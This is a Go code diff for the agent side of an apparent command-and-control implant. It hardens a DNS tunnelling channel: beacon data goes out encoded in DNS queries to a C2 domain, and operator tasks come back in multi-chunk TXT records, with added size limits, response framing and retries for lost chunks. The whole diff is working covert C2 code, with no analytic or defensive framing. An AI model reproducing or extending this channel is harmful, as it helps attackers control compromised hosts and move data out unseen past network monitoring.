@@ -4,8 +4,10 @@ import (
 	"crypto/rand"
 	"encoding/base32"
 	"encoding/hex"
+	"errors"
 	"fmt"
 	"net"
+	"strconv"
 	"strings"
 	"time"
 
@@ -13,14 +15,21 @@ import (
 )
 
 const (
-	agentDNSChunkSize = 30   // must match server-side ChunkForDNS chunk size
-	agentDNSUDPSize   = 4096 // enough for encrypted task TXT responses
+	agentDNSChunkSize    = 30   // must match server-side ChunkForDNS chunk size
+	agentDNSUDPSize      = 4096 // enough for encrypted task TXT responses
+	maxDNSBeaconBytes    = 15 * 1024
+	maxDNSResponseChunks = 128
 )
+
+var errDNSBeaconTooLarge = errors.New("encoded beacon exceeds DNS transport limit")
 
 // sendBeaconDNS transmits an encoded beacon over DNS and returns the server's encrypted response.
 // Each chunk is base32-encoded and sent as a DNS A-record query.
 // The server responds with the task in a TXT record on the final chunk.
 func sendBeaconDNS(encoded []byte, c2Domain string) ([]byte, error) {
+	if len(encoded) > maxDNSBeaconBytes {
+		return nil, fmt.Errorf("%w (%d > %d bytes)", errDNSBeaconTooLarge, len(encoded), maxDNSBeaconBytes)
+	}
 	chunks := chunkData(encoded)
 	total := len(chunks)
 	if total == 0 {
@@ -37,7 +46,7 @@ func sendBeaconDNS(encoded []byte, c2Domain string) ([]byte, error) {
 		return nil, fmt.Errorf("generate DNS session ID: %w", err)
 	}
 
-	var respBytes []byte
+	var firstResponse *mdns.Msg
 	for i, chunk := range chunks {
 		b32 := strings.ToLower(
 			base32.StdEncoding.WithPadding(base32.NoPadding).EncodeToString(chunk),
@@ -57,21 +66,79 @@ func sendBeaconDNS(encoded []byte, c2Domain string) ([]byte, error) {
 
 		// The final chunk carries the hex-encoded TXT response.
 		if i == total-1 {
-			for _, rr := range resp.Answer {
-				if txt, ok := rr.(*mdns.TXT); ok {
-					decoded, err := hex.DecodeString(strings.Join(txt.Txt, ""))
-					if err == nil {
-						respBytes = append(respBytes, decoded...)
-					}
-				}
-			}
+			firstResponse = resp
 		}
 	}
 
-	if len(respBytes) == 0 {
-		return nil, fmt.Errorf("no TXT response received from DNS server")
+	first, totalResponses, err := decodeDNSResponse(firstResponse)
+	if err != nil {
+		// The completed beacon response may have been lost. The server retains
+		// response chunks briefly, so retry chunk zero without replaying it.
+		first, totalResponses, err = retrieveDNSResponseChunk(client, serverAddr, domain, sessionID, AgentID, 0)
+		if err != nil {
+			return nil, err
+		}
+	}
+	if totalResponses < 1 || totalResponses > maxDNSResponseChunks {
+		return nil, fmt.Errorf("invalid DNS response chunk count %d", totalResponses)
+	}
+	respBytes := append([]byte(nil), first...)
+	for index := 1; index < totalResponses; index++ {
+		chunk, chunkTotal, err := retrieveDNSResponseChunk(client, serverAddr, domain, sessionID, AgentID, index)
+		if err != nil {
+			return nil, err
+		}
+		if chunkTotal != totalResponses {
+			return nil, fmt.Errorf("DNS response chunk count changed")
+		}
+		respBytes = append(respBytes, chunk...)
 	}
 	return respBytes, nil
+}
+
+func retrieveDNSResponseChunk(client *mdns.Client, serverAddr, domain, sessionID, agentID string, index int) ([]byte, int, error) {
+	qname := fmt.Sprintf("r.%04d.%s.%s.%s.", index, sessionID, agentID, domain)
+	msg := new(mdns.Msg)
+	msg.SetQuestion(qname, mdns.TypeTXT)
+	msg.SetEdns0(agentDNSUDPSize, false)
+	msg.RecursionDesired = false
+	resp, _, err := client.Exchange(msg, serverAddr)
+	if err != nil {
+		return nil, 0, fmt.Errorf("retrieve DNS response chunk %d: %w", index, err)
+	}
+	return decodeDNSResponse(resp)
+}
+
+func decodeDNSResponse(resp *mdns.Msg) ([]byte, int, error) {
+	if resp == nil {
+		return nil, 0, errors.New("no DNS response received")
+	}
+	for _, rr := range resp.Answer {
+		txt, ok := rr.(*mdns.TXT)
+		if !ok {
+			continue
+		}
+		payload := strings.Join(txt.Txt, "")
+		total := 1
+		if strings.HasPrefix(payload, "v1:") {
+			parts := strings.SplitN(payload, ":", 4)
+			if len(parts) != 4 {
+				return nil, 0, errors.New("invalid DNS response frame")
+			}
+			parsed, err := strconv.Atoi(parts[1])
+			if err != nil {
+				return nil, 0, errors.New("invalid DNS response chunk count")
+			}
+			total = parsed
+			payload = parts[3]
+		}
+		decoded, err := hex.DecodeString(payload)
+		if err != nil {
+			return nil, 0, fmt.Errorf("decode DNS response: %w", err)
+		}
+		return decoded, total, nil
+	}
+	return nil, 0, errors.New("no TXT response received from DNS server")
 }
 
 // chunkData splits data into agentDNSChunkSize-byte chunks.
